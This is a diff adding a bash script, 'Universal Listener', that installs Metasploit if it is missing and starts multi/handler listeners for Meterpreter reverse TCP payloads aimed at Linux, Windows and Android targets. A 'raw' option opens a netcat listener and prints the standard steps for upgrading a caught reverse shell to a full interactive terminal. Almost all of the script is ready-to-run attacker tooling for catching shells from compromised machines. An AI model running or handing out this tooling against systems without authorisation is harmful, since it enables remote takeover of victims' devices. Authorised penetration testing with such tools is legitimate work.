@@ -1,0 +1,22 @@
+#!/bin/bash
+# Universal Listener
+if ! command -v msfconsole &>/dev/null; then
+  if command -v yay &>/dev/null; then
+      yay --needed -S metasploit
+  else
+      sudo apt install metasploit-framework
+  fi
+fi
+if [[ $1 == "linux" ]]; then
+    sudo msfconsole -q -x "use exploit/multi/handler;set payload python/meterpreter_reverse_tcp;set LHOST 0.0.0.0;set LPORT $2;exploit"
+elif [[ $1 == "windows" ]]; then 
+    sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST 0.0.0.0;set LPORT $2;exploit"
+elif [[ $1 == "android" ]]; then
+    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 421; exploit"
+elif [[ $1 == "raw" ]]; then  
+    echo -e "Run -> python -c 'import pty;pty.spawn(\"/bin/bash\")'\n After -> ctrl+z\nexport TERM="xterm";stty size;stty raw -echo;fg"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+    nc -lvnp $2
+else
+    echo -e "usage: listener <os> <port>"
+    exit
+fi
